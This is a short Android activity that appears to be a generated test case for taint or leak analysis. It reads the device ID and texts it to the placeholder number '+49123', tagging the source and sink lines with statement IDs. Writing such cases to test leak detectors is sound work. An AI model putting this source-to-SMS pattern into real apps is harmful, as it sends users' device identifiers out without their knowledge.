package com.generated.app;

import android.app.Activity;
import android.os.Bundle;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.telephony.SmsManager;

public class MainActivity extends Activity {
  private Context context = this;

  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity);
    String sensitiveData = "clear";
    TelephonyManager tm0 = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
    sensitiveData = tm0.getDeviceId(); // statementId: 0
    String[] array1 = new String[10];
    array1[5] = sensitiveData;
    array1[4] = "unsensitive data";
    sensitiveData = array1[5];
    SmsManager sm2 = SmsManager.getDefault();
    sm2.sendTextMessage("+49123", null, sensitiveData, null, null); // statementId: 2

  }

}